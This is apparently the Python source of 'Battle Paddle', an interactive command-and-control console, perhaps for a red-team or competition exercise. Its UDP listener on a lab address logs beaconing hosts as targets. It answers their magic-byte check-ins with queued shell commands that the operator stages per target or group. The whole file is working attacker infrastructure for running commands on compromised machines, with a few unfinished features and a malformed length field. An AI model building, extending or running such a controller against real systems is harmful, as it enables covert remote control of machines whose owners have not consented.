from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import Completer, Completion, NestedCompleter, WordCompleter
from prompt_toolkit.validation import Validator
from pyfiglet import Figlet
import socket
import random
from multiprocessing import Process, Pipe, Manager
from time import sleep
import sys


def socket_listen(targets, responses, pipe):
    MAGIC_BYTES = b'\x42\x50\x3c\x33'
    REQUEST_BYTE = b'\x01'
    RAW_COMMAND = MAGIC_BYTES +  b'\x02\x01'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = ('172.16.245.1', 1337)
    sock.bind(server_address)
    targetCmds = {}
    while True:
        data, addr = sock.recvfrom(4096)
        addrBytes = bytes(map(int, addr[0].split('.')))
        if pipe.poll():
            targetCmds = pipe.recv()
        if addr[0] not in targets:
            targets.append(addr[0])
        if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
            try:
                for cmd in targetCmds[addr[0]]:
                    packet = b'' + RAW_COMMAND + bytes(data[7:11]) + bytes(len(cmd)) + bytes(cmd, 'utf-8')
                    ret = sock.sendto(packet, addr)
                targetCmds.pop(addr[0])
            except KeyError:
                #Send keep alive
                pass
        sleep(.01)

f = Figlet(font=random.choice(Figlet().getFonts()))
f.width = 999
print(f.renderText('Battle Paddle'))

manager = Manager()

targets = manager.list()

executeCommands = {}
responses = manager.dict()
parentEnd, childEnd = Pipe()

p = Process(target=socket_listen, args=(targets, responses, childEnd))
p.start()

groups = {}
stagedCommands = {}

targetCompleter = WordCompleter(targets)
groupCompleter = WordCompleter(groups.keys())
stagedCommandsCompleter = WordCompleter(stagedCommands.keys())

mainCommandsDict =   {
    "show": {
        "targets": None, 
        "info": None,
        "groups": None,
        "staged": {
            "commands": None
        }
    },
    "set" : {
        "name": None,
        "target": {
            "group": groupCompleter,
            "list": targetCompleter
        },
        "command": None
    },
    "del":{
        "group": groupCompleter
    },
    "create":{
        "group": None
    },
    "edit":{
        "group": groupCompleter
    },
    "clear": None,
    "stage": None,
    "execute" : stagedCommandsCompleter,
    "save" : None,
    "load" : None,
    "exit": None,
}

groupCommandsDict = {
    "add": targetCompleter
}

completer = NestedCompleter.from_nested_dict(
    mainCommandsDict
)

completerGroupEdit = NestedCompleter.from_nested_dict(
    groupCommandsDict
)

def is_valid_main(text):
    d = mainCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None and not isinstance(d, WordCompleter):
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
        elif isinstance(d, WordCompleter):
            if word not in d.words:
                return False
    if d is not None and not isinstance(d, WordCompleter):
        return False
    return True
            

def is_valid_group(text):
    d = groupCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None and not isinstance(d, WordCompleter):
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
        elif isinstance(d, WordCompleter):
            if word not in d.words:
                return False
    if d is not None and not isinstance(d, WordCompleter):
        return False
    return True


validatorMain = Validator.from_callable(
    is_valid_main,
    error_message="Invalid command",
    move_cursor_to_end=True,
)

validatorGroup = Validator.from_callable(
    is_valid_group,
    error_message="Invalid command",
    move_cursor_to_end=True,
)

target = set()
commands = list()
commandName = ''

toolbarStr = f'Name: {commandName} Target: {list(target)} Commands: {commands}'

try:
    while 1:
        user_input = prompt(u'BP> ',
                            history=FileHistory('history.txt'),
                            auto_suggest=AutoSuggestFromHistory(),
                            completer=completer,
                            lexer=None,
                            bottom_toolbar=toolbarStr,
                            validator=validatorMain,
                            validate_while_typing=False
                            )

        if user_input == '':
            toolbarStr =  f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'show targets' in user_input:
            print(f'Known targets {targets}')
        elif 'show info' in user_input:
            print(f'Still working on')
        elif 'show groups' in user_input:
            print(f'Groups: {groups}')
        elif 'show staged commands' in user_input:
            print('Staged commands:')
            for k,v in stagedCommands.items():
                print(f'Stage name:{k} -> {v}')
        elif 'set target group' in user_input:
            target.clear()
            s = user_input.strip().split('set target group ')
            if len(s) > 1:
                _, groupName = s
                for g in groupName.split(' ') : target.add(g)
            toolbarStr = f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'set name' in user_input:
            name = ''
            s = user_input.strip().split('set name ')
            if len(s) > 1:
                _, name = s
                commandName = name.split(' ')[0]
            toolbarStr = f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'set target list' in user_input:
            target.clear()
            s = user_input.strip().split('set target list ')
            if len(s) > 1:
                _, tar = s
                for t in tar.split(' ') : target.add(t)
            toolbarStr = f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'set command' in user_input:
            s = user_input.strip().split('set command ')
            if len(s) > 1:
                _, c = s
                commands.append(c)
            toolbarStr = f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'del group' in user_input:
            s = user_input.strip().split('del group ')
            if len(s) > 1:
                _, group = s
                groups.pop(group)
        elif 'create group' in user_input:
            s = user_input.strip().split('create group ')
            if len(s) > 1:
                _, group = s
                groups[group.split(' ')[0]] = set()
        elif 'edit group' in user_input:
            s = user_input.strip().split('edit group ')
            if len(s) > 1:
                _, group = s
                group = group.split(' ')[0]
                group_input = prompt(f'[Edit group {group}]\nBP> ',
                                history=FileHistory('history.txt'),
                                auto_suggest=AutoSuggestFromHistory(),
                                completer=completerGroupEdit,
                                bottom_toolbar=toolbarStr,
                                validator=validatorGroup,
                                validate_while_typing=False
                                )
                if 'add' in group_input:
                    u = group_input.strip().split('add ')
                    if len(u) > 1:
                        _, tar = u
                        for t in tar.split(' ') : groups[group].add(t)
        elif 'clear' in user_input:
            target.clear()
            commands.clear()
            commandName = ''
            toolbarStr =  f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'execute' in user_input:
            executeCommands = {}
            s = user_input.strip().split('execute ')
            if len(s) > 1:
                _, stages = s
                for st in stages.split(' '):
                    t = stagedCommands[st]['target']
                    for ts in t:
                        if ts in groups:
                            for tar in groups[ts]:
                                executeCommands[ts] = stagedCommands[st]['commands']
                        else:
                            executeCommands[ts] = stagedCommands[st]['commands']
            parentEnd.send(executeCommands)
        elif 'stage' in user_input:
            if commandName == '' or len(commands) == 0 or len(target) == 0:
                print('Command is not ready to be staged')
            stagedCommands[commandName] = {
                "commands": commands.copy(),
                "target": target.copy()
            }
            commandName = ''
            commands.clear()
            target.clear()
            toolbarStr = f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        elif 'save' in user_input:
            print('To be implemented')
        elif 'load' in user_input:
            print('To be implemented')
        elif 'exit' in user_input:
            print(f.renderText('GG'))
            p.kill()
            exit()
        else:
            toolbarStr =  f'Name: {commandName} Target: {list(target)} Commands: {commands}'
        print()
except (KeyboardInterrupt, EOFError):
    print(f.renderText('GG'))
    p.kill()
